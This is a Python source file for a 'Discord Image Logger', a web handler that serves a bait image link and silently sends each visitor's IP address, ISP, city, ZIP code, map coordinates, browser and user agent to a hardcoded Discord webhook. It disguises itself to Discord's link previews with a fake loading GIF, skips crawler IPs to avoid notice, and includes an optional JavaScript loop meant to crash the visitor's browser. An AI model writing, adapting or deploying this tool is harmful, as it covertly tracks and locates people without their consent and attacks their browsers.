# -*- coding: utf-8 -*-
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, socket
from datetime import datetime, timezone

__app__         = "Discord Image Logger"
__version__     = "v3.1"
__author__      = "C00lB0i"

config = {
    # ── BASE CONFIG ──────────────────────────────────────────────────────────
    "webhook": "https://discordapp.com/api/webhooks/1473590436055482430/9n7NGn-u_xqmSa9ofFsKc2KW_yXxkRNHSk21c5A94bDnHaEMuSePrSK2WEeNKqpKVhWU",
    "image":   "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDVtZWtpb3JpNXpqOXdtMTBkNGF4dHZnc21vMGN6YXprNTM0cmxwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/ZuzxVIWWHUQDkhrtu6/giphy.gif",
    # Set imageArgument to True to allow ?url=<base64 image url> or ?id=<base64>
    "imageArgument": True,

    # ── CUSTOMIZATION ────────────────────────────────────────────────────────
    "username": "Image Logger",
    "color":    0x00FFFF,

    # ── OPTIONS ──────────────────────────────────────────────────────────────
    "crashBrowser": False,

    "message": {
        "doMessage":   False,
        "message":     "This browser has been pwned by C00lB0i's Image Logger.",
        "richMessage": True,
    },

    # vpnCheck: 0=off | 1=no @everyone ping for VPN | 2=skip alert entirely
    "vpnCheck":   1,
    "linkAlerts": True,
    # buggedImage: serve a fake loading GIF to Discord crawlers so the embed
    # preview shows a "loading" animation instead of the real image.
    "buggedImage": True,

    # antiBot: 0=off | 1=no ping for hosting IPs | 2=no ping 100% bot
    #          3=skip alert hosting | 4=skip alert 100% bot
    "antiBot": 1,

    # ── REDIRECTION ──────────────────────────────────────────────────────────
    # If redirect is True, real users are sent here instead of the image.
    "redirect": {
        "redirect": False,
        "page":     "https://your-link.here",
    },
}

# IP prefixes to silently ignore (Discord/known crawlers)
blacklistedIPs = ("27", "104", "143", "164")

# In-memory visit counter per endpoint
_visit_counts: dict = {}


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _flag(country_code: str) -> str:
    """Convert 2-letter ISO country code to flag emoji."""
    if not country_code or len(country_code) != 2:
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in country_code.upper())


def _rdns(ip: str) -> str:
    """Reverse-DNS lookup. Returns hostname or 'N/A'."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "N/A"


def _get_ip(headers) -> str:
    """
    Safely extract the real visitor IP.
    x-forwarded-for may be a comma-separated list; take the first entry.
    Falls back to x-real-ip, then empty string.
    """
    forwarded = headers.get("x-forwarded-for") or ""
    if forwarded:
        return forwarded.split(",")[0].strip()
    return (headers.get("x-real-ip") or "").strip()


def botCheck(ip: str, useragent: str) -> str | bool:
    if ip.startswith(("34", "35")):
        return "Discord"
    if (useragent or "").startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error: str):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content":  "@everyone",
            "embeds": [{
                "title":       "Image Logger — Error",
                "color":       config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }],
        }, timeout=5)
    except Exception:
        pass


def makeReport(ip, useragent=None, endpoint="N/A", url=False):
    """
    Build and POST a rich Discord embed for a real visitor.
    Location comes from ip-api.com (IP-based, no GPS popup).
    """
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent or "")

    # ── Bot / link-alert path ─────────────────────────────────────────────
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content":  "",
                    "embeds": [{
                        "title": "Image Logger — Link Sent",
                        "color": config["color"],
                        "description": (
                            f"An **Image Logging** link was sent in a chat!\n"
                            f"You may receive an IP soon.\n\n"
                            f"**Endpoint:** `{endpoint}`\n"
                            f"**IP:** `{ip}`\n"
                            f"**Platform:** `{bot}`"
                        ),
                    }],
                }, timeout=5)
            except Exception:
                pass
        return

    # ── Geolocation via ip-api.com ────────────────────────────────────────
    ping = "@everyone"
    try:
        info = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857",
            timeout=5
        ).json()
    except Exception:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    # ── OS / Browser ──────────────────────────────────────────────────────
    os_name, browser_name = httpagentparser.simple_detect(useragent or "")

    # ── Coordinates & Google Maps link (IP-based, no popup) ───────────────
    lat = info.get("lat", "")
    lon = info.get("lon", "")
    if lat and lon:
        maps_url   = f"https://www.google.com/maps?q={lat},{lon}"
        coord_text = f"`{lat}, {lon}` — [Open in Google Maps]({maps_url})"
    else:
        coord_text = "`Unknown`"

    # ── Country flag ─────────────────────────────────────────────────────
    flag = _flag(info.get("countryCode", ""))

    # ── Reverse DNS ───────────────────────────────────────────────────────
    hostname = _rdns(ip)

    # ── Timezone ──────────────────────────────────────────────────────────
    tz_raw    = info.get("timezone", "/")
    tz_parts  = tz_raw.split("/")
    tz_display = (
        f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
        if len(tz_parts) == 2 else tz_raw
    )

    # ── Visit counter ─────────────────────────────────────────────────────
    _visit_counts[endpoint] = _visit_counts.get(endpoint, 0) + 1
    visit_no = _visit_counts[endpoint]

    # ── Timestamp ─────────────────────────────────────────────────────────
    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # ── Build embed description ───────────────────────────────────────────
    description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`   •   **Visit #:** `{visit_no}`

**\U0001f310 IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Hostname (rDNS):** `{hostname}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Org:** `{info.get('org', 'Unknown')}`

**{flag} Location:**
> **Country:** `{info.get('country', 'Unknown')}` {flag}
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **ZIP:** `{info.get('zip', 'Unknown')}`
> **Coords (IP-based):** {coord_text}
> **Timezone:** `{tz_display}`

**\U0001f512 Threat Info:**
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN/Proxy:** `{info.get('proxy', 'Unknown')}`
> **Hosting/Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**\U0001f4bb Device Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`

**User Agent:**
```
{useragent}
```"""

    embed = {
        "username": config["username"],
        "content":  ping,
        "embeds": [{
            "title":       "Image Logger \u2014 IP Logged",
            "color":       config["color"],
            "description": description,
            "footer":      {"text": f"\U0001f550 {now_utc}"},
        }],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception:
        pass

    return info


# ─────────────────────────────────────────────────────────────────────────────
# Fake "loading" GIF served to Discord crawlers
# ─────────────────────────────────────────────────────────────────────────────
binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}


# ─────────────────────────────────────────────────────────────────────────────
# Request handler
# ─────────────────────────────────────────────────────────────────────────────
class ImageLoggerAPI(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        """Suppress default stdout access-log noise."""
        pass

    def handleRequest(self):
        try:
            s   = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            # ── Resolve bait image URL ────────────────────────────────────
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                raw = dic.get("url") or dic.get("id")
                try:
                    url = base64.b64decode(raw.encode()).decode()
                except Exception:
                    url = config["image"]
            else:
                url = config["image"]

            # ── Safely get visitor IP & User-Agent ────────────────────────
            ip = _get_ip(self.headers)
            ua = self.headers.get("user-agent") or ""

            # ── Blacklist check ───────────────────────────────────────────
            if ip and ip.startswith(blacklistedIPs):
                self._redirect(url)
                return

            endpoint = s.split("?")[0]

            # ── Discord / bot crawler path ────────────────────────────────
            # Discord crawls the link to generate an embed preview.
            # We serve the fake loading GIF so the preview looks like a
            # loading animation, then log the link-send event.
            if botCheck(ip, ua):
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header("Content-type", "image/gif")
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self._redirect(url)
                makeReport(ip, ua, endpoint=endpoint, url=url)
                return

            # ── Real visitor path ─────────────────────────────────────────
            # Log the IP immediately, then redirect to the actual image.
            # No JS, no popups, no intermediate page — the image loads instantly.
            makeReport(ip, ua, endpoint=endpoint, url=url)

            if config["redirect"]["redirect"]:
                self._redirect(config["redirect"]["page"])
                return

            if config["message"]["doMessage"]:
                body  = config["message"]["message"].encode()
                ctype = "text/html"
                self.send_response(200)
                self.send_header("Content-type", ctype)
                self.end_headers()
                self.wfile.write(body)
                return

            if config["crashBrowser"]:
                body = b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(body)
                return

            # Default: redirect straight to the image — loads instantly, no popup
            self._redirect(url)

        except Exception:
            try:
                self.send_response(500)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(
                    b"500 - Internal Server Error<br>"
                    b"Check your Discord webhook for the traceback."
                )
                reportError(traceback.format_exc())
            except Exception:
                pass

    def _redirect(self, location: str):
        """Send a 302 redirect to the given URL."""
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()

    do_GET  = handleRequest
    do_POST = handleRequest


handler = app = ImageLoggerAPI
